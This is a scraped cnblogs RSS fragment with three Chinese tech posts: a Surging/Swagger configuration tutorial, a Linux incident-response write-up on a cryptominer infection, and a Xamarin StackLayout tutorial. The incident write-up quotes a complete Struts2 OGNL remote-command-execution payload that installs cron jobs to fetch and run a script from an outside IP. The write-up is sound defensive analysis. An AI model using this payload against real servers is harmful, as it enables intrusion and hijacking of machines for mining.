&lt;h3&gt;xml文档文件设置&lt;/h3&gt;
&lt;p&gt;针对于 swagger 需要生成 schema，那么需要加载接口模块的xml文档文件，可以通过项目-属性-生成-xml文档文件 进行设置，如下图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007214301270-1595689058.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过以上设置，如果扫描加载业务模块，可以使用dotnet publish -c release 生成模块文件，如下图所示&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007214706447-436621047.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;文件配置&lt;/h3&gt;
&lt;p&gt;使用swagger ，如果使用官方提供的surging 引擎的话，就需要开启Kestrel组件，如以下配置所示&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Surging&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Ip&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Surging_Server_IP}|127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WatchInterval&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;30&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Surging_Server_Port}|98&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MappingIp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Mapping_ip}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MappingPort&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Mapping_Port}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MaxConcurrentRequests&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;20&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ExecutionTimeoutInMilliseconds&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;30000&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Protocol&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Protocol}|None&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;//&lt;/span&gt;&lt;span&gt;Http、Tcp、None&lt;/span&gt;
    &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RootPath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${RootPath}|D:\\userapp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Ports&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;HttpPort&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${HttpPort}|280&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WSPort&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${WSPort}|96&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RequestCacheEnabled&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Packages&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: [
      {
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;TypeName&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;EnginePartModule&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Using&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${UseEngineParts}|DotNettyModule;NLogModule;MessagePackModule;ConsulModule;&lt;span&gt;KestrelHttpModule&lt;/span&gt;;WSProtocolModule;EventBusRabbitMQModule;CachingModule;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
      }
    ]
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下是配置swagger，如果不添加以下配置，可以禁用swagger&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;43&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
  &quot;Swagger&quot;: {
    &quot;Version&quot;: &quot;${SwaggerVersion}|V1&quot;, // &quot;127.0.0.1:8500&quot;,
    &quot;Title&quot;: &quot;${SwaggerTitle}|Surging Demo&quot;,
    &quot;Description&quot;: &quot;${SwaggerDes}|surging demo&quot;,
    &quot;Contact&quot;: {
      &quot;Name&quot;: &quot;API Support&quot;,
      &quot;Url&quot;: &quot;https://github.com/dotnetcore/surging&quot;,
      &quot;Email&quot;: &quot;fanliang1@hotmail.com&quot;
    },
    &quot;License&quot;: {
      &quot;Name&quot;: &quot;MIT&quot;,
      &quot;Url&quot;: &quot;https://github.com/dotnetcore/surging/blob/master/LICENSE&quot;
    }
  }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 通过以上设置，就可以通过http://127.0.0.1:280/swagger进行访问，效果如下图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007215922687-132247128.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;测试上传文件&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007220722816-1377269962.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007221652238-1939922189.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;测试下载文件&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007221149685-562368.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007221357140-1034096366.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt; Post 测试&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007222658646-210647417.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007222807631-2112625555.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007222936657-1752933900.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;GET 测试&lt;/h3&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007223048920-1342087317.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007223211775-944800313.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007223256878-1398151253.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;通过swagger 引擎组件能够生成业务接口文档，能够更好的和团队进行协作，而surging计划是去网关中心化，会扩展'关卡(stage)'引擎组件以代替网关，同时也会扩展更多的通信协议，也欢迎大家扩展引擎组件，让生态更强大。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 07 Oct 2018 14:43:00 +0000</pubDate>
<dc:creator>fanly11</dc:creator>
<og:description>1、前言 微服务架构概念的提出已经有非常长一段时间了，但在近期几年却开始频繁地出现，大家都着手升级成微服务架构，使用着各种技术，大家认为框架有服务治理就是微服务，实现单一协议的服务调用，微服务虽然没有</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fanliang11/p/9751908.html</dc:identifier>
</item>
<item>
<title>Linux应急响应（三）：挖矿病毒 - Bypass</title>
<link>http://www.cnblogs.com/xiaozi/p/9751905.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaozi/p/9751905.html</guid>
<description>&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007223935754-164004360.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-1.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/p&gt;

&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;A、排查过程&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007223949643-180882325.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007223955305-1760945919.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-2.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-2.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-3.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-3.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;下载logo.jpg，包含脚本内容如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224006784-353571789.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-4.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224022478-1847404984.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-5.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;B、溯源分析&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 在Tomcat log日志中，我们找到这样一条记录：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224036399-468561590.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-6.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-6.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;对日志中攻击源码进行摘录如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;code&gt;{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo &quot;*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh&quot; | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;C、清除病毒&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;1、删除定时任务:&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224104456-1801207334.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-7.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-7.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;span&gt;2、终止异常进程:&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-7.png&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224113387-164272923.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-8.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-8.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;D、漏洞修复&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 升级struts到最新版本&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 针对服务器被感染挖矿程序的现象，总结了几种预防措施：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;md-fences md-end-block&quot;&gt;
&lt;span&gt;1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护&lt;br/&gt;&lt;span&gt;2、及时更新 Windows安全补丁，开启防火墙临时关闭端口&lt;br/&gt;&lt;span&gt;3、及时更新web漏洞补丁，升级web组件&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;

&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;关于我：一个网络安全爱好者，致力于分享原创高质量干货，欢迎关注我的个人微信公众号：Bypass--，浏览更多精彩文章。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/894761/201806/894761-20180604111856354-1328510502.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 14:42:00 +0000</pubDate>
<dc:creator>Bypass</dc:creator>
<og:description>0x00 前言 ​ 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiaozi/p/9751905.html</dc:identifier>
</item>
<item>
<title>xamarin forms常用的布局stacklayout详解 - 张林-布莱恩特</title>
<link>http://www.cnblogs.com/zhangmumu/p/9751788.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhangmumu/p/9751788.html</guid>
<description>&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;通过这篇文章你将了解到xamarin forms中最简单常用的布局StackLayout。至于其他几种布局使用起来，效果相对较差，目前在项目中使用最多的也就是这两种布局StackLayout和Grid。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;之前上一家的的同事在写xamarin android的时候，聊天给我说他写axml布局的时候都是拖控件，这有点刷新我认知的下线，一直拖控件“历史原因”，造成的坏处是显而易见的，无法熟练掌握布局的常用属性，至于xamarin forms能不能拖控件，就目前来说是不能的，布局的设计有两种实现方式，一种是以c#代码的方式，一种是以xaml布局的方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如下图是xamarin forms中最见的五种布局，本篇文章将使用最常用的一种布局StackLayout，实现一个简易计算器的布局，便于熟悉和掌握这种布局的各种属性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://docs.microsoft.com/zh-cn/xamarin/xamarin-forms/user-interface/layouts/images/layouts-sml.png&quot; alt=&quot;xamarin forms常用的布局stacklayout、grid详解&quot;/&gt;&lt;/p&gt;
&lt;p&gt;StackLayout相似于android中LinearLayout、前端css中的默认的Static定位；Grid相似于android中GridLayout，html中的Table布局。&lt;/p&gt;
&lt;h4 id=&quot;stacklayout布局属性和属性值的作用&quot;&gt;1.StackLayout布局属性和属性值的作用&lt;/h4&gt;
&lt;p&gt;顾名思义，StackLayout是一种可以在上下方向、左右方向堆叠的布局，简单而又常用的布局，我们需要掌握它的三个重要属性，最重要的是布局方向和布局定位。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Orientation :布局方向，枚举类型，表示StackLayout以哪种方向的布局， Vertical (垂直方向布局) 和&lt;br/&gt;Horizontal（水平方向布局）,默认值是Vertical.&lt;/li&gt;
&lt;li&gt;Spacing :double类型，表示每个子视图之间的间隙, 默认值 6.0.&lt;/li&gt;
&lt;li&gt;VerticalOptions和HorizontalOptions：布局定位（既可以定位又可以设置布局元素大小），该属性的属性值有8个分别是
&lt;ol&gt;&lt;li&gt;Start：在父布局开始位置&lt;/li&gt;
&lt;li&gt;Center：在父布局中间位置&lt;/li&gt;
&lt;li&gt;End：在父布局最后位置&lt;/li&gt;
&lt;li&gt;Fill：填充整个父布局的位置&lt;/li&gt;
&lt;li&gt;StartAndExpand、CenterAndExpand、EndAndExpand、FillAndExpand，这种带AndExpand的作用就是：根据其他布局的内容大小，如果有空白位置就会自动填充。当多个属性值都是AndExpand则会平分空白部分。&lt;br/&gt;直接来个布局看看这些个属性到底是怎么用的吧&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221623622-1066928199.png&quot;/&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&amp;gt;
&amp;lt;ContentPage xmlns=&quot;http://xamarin.com/schemas/2014/forms&quot;
             xmlns:x=&quot;http://schemas.microsoft.com/winfx/2009/xaml&quot;
             xmlns:local=&quot;clr-namespace:XamarinFormsLayout&quot;
             x:Class=&quot;XamarinFormsLayout.MainPage&quot;&amp;gt;
    &amp;lt;StackLayout Orientation=&quot;Vertical&quot;&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Vertical&quot; BackgroundColor=&quot;Accent&quot; VerticalOptions=&quot;FillAndExpand&quot; Padding=&quot;10&quot;&amp;gt;
            &amp;lt;Label Text=&quot;我在左边&quot; 
           HeightRequest=&quot;100&quot;
           WidthRequest=&quot;200&quot;
           HorizontalOptions=&quot;Start&quot;
           VerticalOptions=&quot;Start&quot;
           BackgroundColor=&quot;AliceBlue&quot;
           TextColor=&quot;Black&quot;
           VerticalTextAlignment=&quot;Center&quot;/&amp;gt;
            &amp;lt;Label Text=&quot;我在右边&quot; 
           HorizontalOptions=&quot;End&quot;
           VerticalOptions=&quot;End&quot;
           BackgroundColor=&quot;AliceBlue&quot;
           TextColor=&quot;Black&quot;
           VerticalTextAlignment=&quot;Center&quot;/&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; BackgroundColor=&quot;Aquamarine&quot; VerticalOptions=&quot;Start&quot; HeightRequest=&quot;50&quot;&amp;gt;
            &amp;lt;Label HorizontalOptions=&quot;Start&quot; VerticalOptions=&quot;CenterAndExpand&quot;  Text=&quot;我在左边&quot; TextColor=&quot;Black&quot; BackgroundColor=&quot;Azure&quot;&amp;gt;&amp;lt;/Label&amp;gt;
            &amp;lt;Label HorizontalOptions=&quot;FillAndExpand&quot; VerticalOptions=&quot;CenterAndExpand&quot;  Text=&quot;占满中间位置&quot; TextColor=&quot;Black&quot; BackgroundColor=&quot;Azure&quot;&amp;gt;&amp;lt;/Label&amp;gt;
            &amp;lt;Label HorizontalOptions=&quot;End&quot; VerticalOptions=&quot;CenterAndExpand&quot;  Text=&quot;我在右边&quot; TextColor=&quot;Black&quot; BackgroundColor=&quot;Azure&quot;&amp;gt;&amp;lt;/Label&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Vertical&quot; BackgroundColor=&quot;Accent&quot;  Padding=&quot;10&quot;  VerticalOptions=&quot;FillAndExpand&quot;&amp;gt;
            &amp;lt;!-- Place new controls here --&amp;gt;
            &amp;lt;Label Text=&quot;我在顶部,高度平分&quot; 
              HorizontalOptions=&quot;StartAndExpand&quot;
              VerticalOptions=&quot;FillAndExpand&quot;
              BackgroundColor=&quot;Red&quot;/&amp;gt;
            &amp;lt;Label Text=&quot;我在中间，高度平分&quot; 
              HorizontalOptions=&quot;FillAndExpand&quot;
              VerticalOptions=&quot;FillAndExpand&quot;
              BackgroundColor=&quot;Red&quot;/&amp;gt;
            &amp;lt;Label Text=&quot;我在底部&quot; 
              HorizontalOptions=&quot;FillAndExpand&quot;
              VerticalOptions=&quot;EndAndExpand&quot;
              BackgroundColor=&quot;Red&quot;/&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
    &amp;lt;/StackLayout&amp;gt;
&amp;lt;/ContentPage&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;直接设置高度宽度可以用HeightRequest和WidthRequest；&lt;/p&gt;
&lt;h4 id=&quot;stacklayout布局重点需要掌握&quot;&gt;2.StackLayout布局重点需要掌握&lt;/h4&gt;
&lt;h5 id=&quot;verticaloptions和horizontaloptions与widthrequest和heightrequest的优先级关系是什么&quot;&gt;2.1 VerticalOptions和HorizontalOptions与WidthRequest和HeightRequest的优先级关系是什么？&lt;/h5&gt;
&lt;p&gt;这一点容易混淆，我们已经知道VerticalOptions和HorizontalOptions是用来定位和设置大小的，WidthRequest和HeightRequest是double类型，只能用来设置控件大小。当都设置了这四个属性，会出现什么样的结果。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221757140-317676299.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;里面两个子StackLayout的高度各占50%，我们发现** Options和**Request 的属性值所定义的大小谁大就以谁的值为主。&lt;/p&gt;
&lt;h5 id=&quot;在垂直方向水平方向设置宽度widthrequest高度heightrequest无效如图&quot;&gt;2.2 在垂直方向（水平方向）设置宽度WidthRequest（高度HeightRequest）无效，如图：&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221700789-450454678.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
